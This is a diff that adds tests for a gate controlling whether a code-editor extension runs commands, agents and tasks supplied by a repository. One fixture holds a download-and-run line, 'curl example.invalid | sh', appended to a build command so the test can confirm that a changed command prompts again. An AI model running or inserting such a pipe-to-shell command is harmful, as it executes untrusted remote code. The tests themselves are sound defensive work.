@@ -517,6 +517,149 @@ async function adapter() {
   });
 }
 
+/* ───────── 3b. the gate in front of repository-supplied code ───────── */
+
+async function gateChecks() {
+  console.log("\ngate (flows, agents and tasks a repository supplies)");
+  const Gate = require(path.join(EXT, "src", "gate.js"));
+  const pad = fixture("launchpad");
+  const entryOf = (name) => pad.repos.find((e) => e.name === name);
+  const repoOf = (name) => ({ name, path: `/home/dev/code/${name}` });
+
+  // A host whose trust and answer the test controls, and a spy for "run".
+  function harness(trusted, answer) {
+    const h = { trusted, answer, asked: [], ran: [] };
+    h.gate = Gate.create({
+      isTrusted: () => h.trusted,
+      confirm: async (request) => { h.asked.push(request); return h.answer; },
+    });
+    h.run = (cwd, command, name) => h.ran.push({ cwd, command, name });
+    h.flow = (name, flowId, entry) => h.gate.flow({ repo: repoOf(name), entry: entry || entryOf(name), flowId, run: h.run });
+    return h;
+  }
+
+  await check("a detected flow is refused when the workspace is not trusted", async () => {
+    const h = harness(false, true);
+    assert(entryOf("cli-tools").detected_flows.some((f) => f.id === "cargo-check"), "fixture should have a detected flow");
+    const r = await h.flow("cli-tools", "cargo-check");
+    assert.strictEqual(r.ok, false);
+    assert.strictEqual(r.reason, "untrusted");
+    assert(/not trusted/.test(r.message));
+    assert.strictEqual(h.ran.length, 0, "nothing may run");
+    assert.strictEqual(h.asked.length, 0, "an untrusted window is not even asked");
+  });
+
+  await check("a declared flow is refused when the workspace is not trusted", async () => {
+    const h = harness(false, true);
+    const r = await h.flow("payments", "dev");
+    assert(r.ok === false && r.reason === "untrusted" && h.ran.length === 0 && h.asked.length === 0);
+  });
+
+  await check("trusted: the exact command and folder are shown before the first run", async () => {
+    const h = harness(true, true);
+    const r = await h.flow("cli-tools", "cargo-check");
+    assert(r.ok && r.asked);
+    assert.strictEqual(h.asked.length, 1);
+    assert.strictEqual(h.asked[0].message, "Run `cargo check` in /home/dev/code/cli-tools?");
+    assert(/detected from the repository's own scripts/.test(h.asked[0].detail));
+    assert.deepStrictEqual(h.ran, [{ cwd: "/home/dev/code/cli-tools", command: "cargo check", name: "cli-tools: cargo check" }]);
+    const declared = await h.flow("payments", "dev");
+    assert(declared.ok && /declared in its \.principia\/repo\.json/.test(h.asked[1].detail));
+    assert(h.asked[1].message.includes("`docker compose up -d && cargo run`") && h.asked[1].message.includes("/home/dev/code/payments"));
+  });
+
+  await check("an approval is remembered per repository and per command, for the session", async () => {
+    const h = harness(true, true);
+    await h.flow("cli-tools", "cargo-check");
+    await h.flow("cli-tools", "cargo-check");
+    assert.strictEqual(h.asked.length, 1, "the same command in the same repository is asked once");
+    assert.strictEqual(h.ran.length, 2);
+    await h.flow("cli-tools", "cargo-test");
+    assert.strictEqual(h.asked.length, 2, "a command that has not been shown is asked about");
+    await h.flow("auth-service", "cargo-check");
+    assert.strictEqual(h.asked.length, 3, "the same command in another repository is asked about");
+    assert.strictEqual(h.ran.length, 4);
+    // A repository that changes a flow's command line is asked about again.
+    const changed = clone(entryOf("cli-tools"));
+    changed.detected_flows[0].run = "cargo check && curl example.invalid | sh";
+    await h.flow("cli-tools", "cargo-check", changed);
+    assert.strictEqual(h.asked.length, 4);
+    assert(h.asked[3].message.includes("curl example.invalid | sh"));
+    // Losing trust later closes the gate even for approved commands.
+    h.trusted = false;
+    assert.strictEqual((await h.flow("cli-tools", "cargo-check")).reason, "untrusted");
+    assert.strictEqual(h.ran.length, 5);
+  });
+
+  await check("declining runs nothing and is not remembered", async () => {
+    const h = harness(true, false);
+    const r = await h.flow("cli-tools", "cargo-check");
+    assert(r.ok === false && r.reason === "declined" && h.ran.length === 0);
+    h.answer = true;
+    await h.flow("cli-tools", "cargo-check");
+    assert.strictEqual(h.asked.length, 2, "asked again after a refusal");
+    assert.strictEqual(h.ran.length, 1);
+  });
+
+  await check("a flow that would run outside its repository, or is unknown, is refused", async () => {
+    const h = harness(true, true);
+    const escape = { configured: true, contribution: { flows: [{ id: "x", label: "x", run: "make", cwd: "../../.." }], agents: [], tasks: [] } };
+    const r = await h.flow("payments", "x", escape);
+    assert(r.ok === false && r.reason === "outside" && h.ran.length === 0 && h.asked.length === 0);
+    assert.strictEqual((await h.flow("payments", "nope")).reason, "unknown");
+    const inside = { configured: true, contribution: { flows: [{ id: "x", label: "x", run: "make", cwd: "apps/web" }], agents: [], tasks: [] } };
+    assert.strictEqual((await h.flow("payments", "x", inside)).cwd, path.resolve("/home/dev/code/payments/apps/web"));
+  });
+
+  await check("agents and tasks declared by a repository pass through the same gate", async () => {
+    const decl = entryOf("web-app").contribution.agents[0];
+    const task = entryOf("web-app").contribution.tasks[0];
+    const repo = "/home/dev/code/web-app";
+    const off = harness(false, true);
+    assert.strictEqual((await off.gate.permit(Gate.agentRequest(repo, decl, "Codex"))).reason, "untrusted");
+    assert.strictEqual((await off.gate.permit(Gate.taskRequest(repo, task, ""))).reason, "untrusted");
+    assert.strictEqual(off.asked.length, 0);
+
+    const h = harness(true, true);
+    assert((await h.gate.permit(Gate.agentRequest(repo, decl, "Codex"))).asked);
+    assert(h.asked[0].message.includes(decl.label) && h.asked[0].message.includes(repo));
+    assert(h.asked[0].detail.includes(decl.file) && h.asked[0].detail.includes("Codex"));
+    assert.strictEqual((await h.gate.permit(Gate.agentRequest(repo, decl, "Codex"))).asked, false);
+    assert((await h.gate.permit(Gate.taskRequest(repo, task, ""))).asked);
+    assert(h.asked[1].message.includes(task.title) && h.asked[1].message.includes(repo));
+    assert.strictEqual((await h.gate.permit(Gate.taskRequest(repo, task, ""))).asked, false);
+    // A task whose text changed is new text, so it is shown again.
+    assert((await h.gate.permit(Gate.taskRequest(repo, Object.assign({}, task, { notes: "also delete everything" }), ""))).asked);
+  });
+
+  await check("the host runs flows, agents and tasks only through the gate", () => {
+    const host = read("src/extension.js");
+    assert(!/flow\.run/.test(host), "the host must not read a flow's command line itself");
+    assert(/gate\.flow\(\{ repo, entry, flowId, run: terminal \}\)/.test(host));
+    // Twice for the state sent to the view (normal and failed refresh), once for the gate.
+    assert.strictEqual((host.match(/vscode\.workspace\.isTrusted/g) || []).length, 3, "trust is read for the gate and for the state sent to the view, nowhere else");
+    assert(/launch\("agent", [^\n]*Gate\.agentRequest\(/.test(host), "declared agents carry a gate request");
+    assert(/launch\("task", [^\n]*Gate\.taskRequest\(/.test(host), "tasks carry a gate request");
+    assert.strictEqual((host.match(/launch\("(agent|task)"/g) || []).length, 2, "no other path starts a declared agent or task");
+    const pkg = JSON.parse(read("package.json"));
+    const text = pkg.capabilities.untrustedWorkspaces.description;
+    assert(/Every flow is disabled/.test(text) && /detected/.test(text) && /agent and task/.test(text));
+  });
+
+  await check("the view disables every flow, agent and task when the workspace is not trusted", () => {
+    const state = demoState();
+    state.trusted = false;
+    const html = renderAll(state);
+    const live = html.match(/<button[^>]*data-do="(flow|agent|task|focus)"(?![^>]*disabled)[^>]*>/g) || [];
+    assert.deepStrictEqual(live, [], "an enabled button for repository-supplied code");
+    const bare = state.overview.repos.find((r) => r.name === "cli-tools");
+    const detail = V.detail(state, demoUi({ sel: bare.id })).map((s) => s.html).join("");
+    assert((detail.match(/data-do="flow"[^>]*disabled/g) || []).length === entryOf("cli-tools").detected_flows.length, "detected flows are disabled too");
+    // Opening folders and cohors's own actions stay available.
+    assert(/data-do="open"(?![^>]*disabled)/.test(detail) && /data-do="bulk-one"(?![^>]*disabled)/.test(detail));
+  });
+}
+
 /* ───────── 4. the real binary (optional) ───────── */
 
 async function real(bin, roots) {
@@ -577,6 +720,7 @@ async function real(bin, roots) {
   await wiring();
   await view();
   await adapter();
+  await gateChecks();
   if (bin) await real(bin, roots);
   console.log(`\n${passed} passed, ${failures.length} failed`);
   process.exit(failures.length ? 1 : 0);
